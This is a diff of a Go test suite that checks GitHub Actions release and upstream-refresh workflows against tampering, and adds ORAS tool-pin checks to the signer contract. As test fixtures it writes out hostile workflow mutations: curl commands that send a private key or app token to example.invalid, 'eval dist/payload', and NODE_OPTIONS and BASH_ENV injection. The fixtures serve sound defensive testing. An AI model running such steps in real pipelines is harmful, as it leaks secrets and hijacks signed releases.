@@ -182,7 +182,7 @@ func TestValidateReleaseWorkflowPublicationGateRejectsPolicyPathOverrides(t *tes
 
 func TestValidateReleaseWorkflowAuthoritySplit(t *testing.T) {
 	content := readReleaseWorkflow(t)
-	if err := metadatautil.ValidateReleaseWorkflowAuthoritySplit(string(content)); err != nil {
+	if err := metadatautil.ValidateReleaseWorkflowAuthoritySplit(string(content), repoReleaseSignerPins(t)); err != nil {
 		t.Fatalf("ValidateReleaseWorkflowAuthoritySplit() error = %v", err)
 	}
 	mutated := strings.Replace(string(content), "    permissions:\n      contents: read\n    outputs:\n      digest: ${{ steps.build_amd64.outputs.digest }}", "    permissions:\n      contents: read\n      packages: write\n    outputs:\n      digest: ${{ steps.build_amd64.outputs.digest }}", 1)
@@ -209,14 +209,14 @@ func TestValidateReleaseWorkflowAuthoritySplitRejectsEvasions(t *testing.T) {
 				"          oras cp --recursive --from-oci-layout \\\n"+
 				"            \"dist/image-arm64/layout@${ARM64_DIGEST}\" \\\n"+
 				"            --to-oci-layout dist/release-image:arm64",
-			"copy both platform images", metadatautil.ValidateReleaseWorkflowAuthoritySplit)
+			"copy both platform images", releaseAuthorityValidator(t))
 	})
 	t.Run("multi-arch index", func(t *testing.T) {
 		RequireRejectsAllEvasions(t, workflow,
 			"          oras manifest index create --oci-layout \\\n"+
 				"            \"dist/release-image:${RELEASE_TAG}\" \\\n"+
 				"            amd64 arm64 >/dev/null",
-			"assemble the multi-arch index", metadatautil.ValidateReleaseWorkflowAuthoritySplit)
+			"assemble the multi-arch index", releaseAuthorityValidator(t))
 	})
 }
 
@@ -487,8 +487,10 @@ func TestValidateReleaseWorkflowAuthoritySplitRejectsSignerDrift(t *testing.T) {
 	mutations := []string{
 		strings.Replace(workflow, "  IMAGE_NAME: ghcr.io/${{ github.repository }}", "  IMAGE_NAME: ghcr.io/${{ github.repository_owner }}/other", 1),
 		strings.Replace(workflow, "          test \"$(cut -d@ -f2 trusted-subjects/workcell-image.digest)\" = \"${EXPECTED_IMAGE_DIGEST}\"\n", "", 1),
-		strings.Replace(workflow, "  WORKCELL_ORAS_VERSION: 1.3.3", "  WORKCELL_ORAS_VERSION: 1.3.4", 1),
-		strings.Replace(workflow, "  WORKCELL_ORAS_LINUX_AMD64_SHA256: 9ce999f8d2de03fc03968b29d743077a58783e545e5eaa53917ca177352d0e59", "  WORKCELL_ORAS_LINUX_AMD64_SHA256: 0000000000000000000000000000000000000000000000000000000000000000", 1),
+		// The signer binds its ORAS pins from its own pins step.
+		replaceInReleaseJob(t, workflow, "sign-release", "WORKCELL_ORAS_VERSION: ${{ steps.pins.outputs.oras_version }}", "WORKCELL_ORAS_VERSION: 1.3.3"),
+		replaceInReleaseJob(t, workflow, "sign-release", "WORKCELL_ORAS_LINUX_AMD64_SHA256: ${{ steps.pins.outputs.oras_linux_amd64_sha256 }}", "WORKCELL_ORAS_LINUX_AMD64_SHA256: ${{ steps.pins.outputs.oras_version }}"),
+		replaceInReleaseJob(t, workflow, "sign-release", "      - id: pins\n        name: Load tool pins\n        run: ./scripts/ci/load-tool-pins.sh\n", "      - id: pins\n        name: Load tool pins\n        run: ./scripts/ci/load-tool-pins.sh policy/other.toml\n"),
 		strings.Replace(workflow, "(cd dist && sha256sum -c SHA256SUMS)", "sha256sum -c dist/SHA256SUMS", 1),
 		strings.Replace(workflow, "      BUNDLE_NAME: workcell-${{ needs.tag-policy.outputs.release_tag }}.tar.gz", "      BUNDLE_NAME: workcell-${{ needs.tag-policy.outputs.release_tag }}.tar.gz\n      EXTRA: forbidden", 1),
 		strings.Replace(workflow, "      - name: Sign release image", "      - name: Unexpected command\n        run: eval dist/payload\n\n      - name: Sign release image", 1),
@@ -497,6 +499,22 @@ func TestValidateReleaseWorkflowAuthoritySplitRejectsSignerDrift(t *testing.T) {
 	for _, mutated := range mutations {
 		requireReleaseAuthorityError(t, mutated, "exact privileged step contract")
 	}
+}
+
+// replaceInReleaseJob replaces the first occurrence of old inside one job of
+// the release workflow, so a mutation lands in that job and not an earlier one.
+func replaceInReleaseJob(t *testing.T, workflow, job, old, replacement string) string {
+	t.Helper()
+	start := strings.Index(workflow, "\n  "+job+":\n")
+	if start < 0 {
+		t.Fatalf("release workflow has no job %s", job)
+	}
+	offset := strings.Index(workflow[start:], old)
+	if offset < 0 {
+		t.Fatalf("release job %s does not contain %q", job, old)
+	}
+	at := start + offset
+	return workflow[:at] + replacement + workflow[at+len(old):]
 }
 
 func readReleaseWorkflow(t *testing.T) []byte {
@@ -508,9 +526,62 @@ func readReleaseWorkflow(t *testing.T) []byte {
 	return content
 }
 
+// repoReleaseSignerPins reads the signer's ORAS pins from the repository's
+// policy/tool-pins.toml, the values the signer contract digest covers.
+func repoReleaseSignerPins(t *testing.T) metadatautil.ReleaseSignerPins {
+	t.Helper()
+	pins, err := metadatautil.LoadReleaseSignerPins(filepath.Join("..", "..", "policy", "tool-pins.toml"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	return pins
+}
+
+func releaseAuthorityValidator(t *testing.T) func(string) error {
+	pins := repoReleaseSignerPins(t)
+	return func(workflow string) error {
+		return metadatautil.ValidateReleaseWorkflowAuthoritySplit(workflow, pins)
+	}
+}
+
+// TestReleaseSignerContractCoversOrasPins proves an ORAS version or digest
+// change in policy/tool-pins.toml alone breaks the signer contract, so it
+// needs a reviewed change to the contract digest too.
+func TestReleaseSignerContractCoversOrasPins(t *testing.T) {
+	workflow := string(readReleaseWorkflow(t))
+	pins := repoReleaseSignerPins(t)
+	if err := metadatautil.ValidateReleaseWorkflowAuthoritySplit(workflow, pins); err != nil {
+		t.Fatalf("ValidateReleaseWorkflowAuthoritySplit() with the repository pins error = %v", err)
+	}
+	version := pins
+	version.OrasVersion = "9.9.9"
+	digest := pins
+	digest.OrasLinuxAMD64SHA256 = strings.Repeat("0", 64)
+	swapped := releaseSignerPinsSwapped(pins)
+	for name, changed := range map[string]metadatautil.ReleaseSignerPins{
+		"version": version,
+		"digest":  digest,
+		"swapped": swapped,
+		"empty":   {},
+	} {
+		t.Run(name, func(t *testing.T) {
+			err := metadatautil.ValidateReleaseWorkflowAuthoritySplit(workflow, changed)
+			if err == nil || !strings.Contains(err.Error(), "exact privileged step contract") {
+				t.Fatalf("ValidateReleaseWorkflowAuthoritySplit() error = %v, want the signer contract to reject changed ORAS pins", err)
+			}
+		})
+	}
+}
+
+// releaseSignerPinsSwapped exchanges the two pins, which a contract that
+// hashed them as an unordered set would miss.
+func releaseSignerPinsSwapped(pins metadatautil.ReleaseSignerPins) metadatautil.ReleaseSignerPins {
+	return metadatautil.ReleaseSignerPins{OrasVersion: pins.OrasLinuxAMD64SHA256, OrasLinuxAMD64SHA256: pins.OrasVersion}
+}
+
 func requireReleaseAuthorityError(t *testing.T, workflow, want string) {
 	t.Helper()
-	err := metadatautil.ValidateReleaseWorkflowAuthoritySplit(workflow)
+	err := metadatautil.ValidateReleaseWorkflowAuthoritySplit(workflow, repoReleaseSignerPins(t))
 	if err == nil || !strings.Contains(err.Error(), want) {
 		t.Fatalf("ValidateReleaseWorkflowAuthoritySplit() error = %v, want %q", err, want)
 	}
@@ -1270,9 +1341,6 @@ const upstreamRefreshWorkflowFixture = `name: Upstream refresh
 on:
   workflow_dispatch:
 
-env:
-  WORKCELL_COSIGN_VERSION: v3.0.6
-
 jobs:
   refresh:
     runs-on: ubuntu-latest
@@ -1286,9 +1354,12 @@ jobs:
         with:
           fetch-depth: 0
           persist-credentials: false
+      - id: pins
+        name: Load tool pins
+        run: ./scripts/ci/load-tool-pins.sh
       - uses: sigstore/cosign-installer@cad07c2e89fa2edd6e2d7bab4c1aa38e53f76003 # v4.1.1
         with:
-          cosign-release: ${{ env.WORKCELL_COSIGN_VERSION }}
+          cosign-release: ${{ steps.pins.outputs.cosign }}
       - run: sudo install -m 0755 "$(command -v cosign)" /usr/local/bin/cosign
       - if: steps.existing_pr.outputs.provider == ''
         env:
@@ -1443,7 +1514,7 @@ func TestValidateUpstreamRefreshWorkflowRejectsMutations(t *testing.T) {
 		{"presence step leaks the private key", "      - id: app-token\n", "      - id: secrets\n        env:\n          APP_CLIENT_ID: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}\n          APP_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: curl -d \"${APP_PRIVATE_KEY}\" https://example.invalid\n      - id: app-token\n", "App token only in the publish script step"},
 		{"scope-guard loses continue-on-error", "        continue-on-error: true\n", "", "scope-guard job must run the scope guard as its only run step"},
 		{"scope-guard job env sets BASH_ENV", "  scope-guard:\n", "  scope-guard:\n    env:\n      BASH_ENV: ./exit0.sh\n", "not inherit workflow or job env"},
-		{"workflow env sets NODE_OPTIONS", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n  NODE_OPTIONS: --require=${{ github.workspace }}/wrapper.js\n", "not inherit workflow or job env"},
+		{"workflow env sets NODE_OPTIONS", "jobs:\n  refresh:\n", "env:\n  NODE_OPTIONS: --require=${{ github.workspace }}/wrapper.js\njobs:\n  refresh:\n", "not inherit workflow or job env"},
 		{"publish job env sets BASH_ENV", "    environment:\n      name: upstream-refresh\n", "    environment:\n      name: upstream-refresh\n    env:\n      BASH_ENV: ./wrapper.sh\n", "not inherit workflow or job env"},
 		{"publisher drops its shell pin", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        if: steps.secrets.outputs.present == 'true'\n", "      - if: steps.secrets.outputs.present == 'true'\n", "must run only the publish script"},
 		{"publish replaces the script before running it", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        if:", "      - run: echo x > scripts/ci/upstream-refresh-publish.sh\n      - shell: bash --noprofile --norc -euo pipefail {0}\n        if:", "must not run other steps before the publish script"},
@@ -1452,7 +1523,7 @@ func TestValidateUpstreamRefreshWorkflowRejectsMutations(t *testing.T) {
 		{"publish runs on a self-hosted runner", "  publish:\n    runs-on: ubuntu-latest\n", "  publish:\n    runs-on: self-hosted\n", "must run on ubuntu-latest"},
 		{"scope-guard step moves its working directory", "      - id: guard\n", "      - id: guard\n        working-directory: attacker\n", "scope-guard job must run the scope guard as its only run step"},
 		{"publisher moves its working directory", "        env:\n          GH_TOKEN: ${{ steps.app-token.outputs.token }}\n", "        working-directory: attacker\n        env:\n          GH_TOKEN: ${{ steps.app-token.outputs.token }}\n", "must run only the publish script"},
-		{"workflow default working directory", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "defaults:\n  run:\n    working-directory: attacker\nenv:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "not inherit workflow or job env"},
+		{"workflow default working directory", "jobs:\n  refresh:\n", "defaults:\n  run:\n    working-directory: attacker\njobs:\n  refresh:\n", "not inherit workflow or job env"},
 		{"publish job defaults", "  publish:\n    runs-on: ubuntu-latest\n", "  publish:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: attacker\n", "not inherit workflow or job env"},
 		{"post-publish step sends the token from its shell", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - shell: curl -d ${{ steps.app-token.outputs.token }} https://example.invalid; bash {0}\n        run: \"true\"\n", "App token only in the publish script step"},
 		{"post-publish step puts the token in its working directory", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - working-directory: /tmp/${{ steps.app-token.outputs.token }}\n        run: echo \"${PWD}\"\n", "App token only in the publish script step"},
@@ -2187,7 +2258,7 @@ func TestWorkflowValidatorsRejectUnmodelledKeysAndJobConditions(t *testing.T) {
 		{"unmodelled step key", release, "      - name: Recheck hosted controls and publish GitHub release assets\n", "      - name: Recheck hosted controls and publish GitHub release assets\n        decoy: true\n", "field decoy not found", metadatautil.ValidateReleaseWorkflowPublicationGate},
 		{"publish job skipped", release, "  publish-github-release:\n", "  publish-github-release:\n    if: false\n", "must run unconditionally", metadatautil.ValidateReleaseWorkflowPublicationGate},
 		{"verify job skipped", release, "  verify-release-outputs:\n", "  verify-release-outputs:\n    if: false\n", "must run unconditionally", metadatautil.ValidateReleaseWorkflowPublicationGate},
-		{"release job skipped", release, "  release:\n", "  release:\n    if: false\n", "must run unconditionally", metadatautil.ValidateReleaseWorkflowAuthoritySplit},
+		{"release job skipped", release, "  release:\n", "  release:\n    if: false\n", "must run unconditionally", releaseAuthorityValidator(t)},
 		{"upstream publish job skipped", upstreamRefreshWorkflowFixture, "needs: [refresh, scope-guard]\n" + onCandidate, "needs: [refresh, scope-guard]\n    if: false\n", "publish job must run only when", metadatautil.ValidateUpstreamRefreshWorkflow},
 		{"upstream scope-guard condition widened", upstreamRefreshWorkflowFixture, "needs: refresh\n" + onCandidate, "needs: refresh\n    if: always()\n", "scope-guard job must run only when", metadatautil.ValidateUpstreamRefreshWorkflow},
 	}
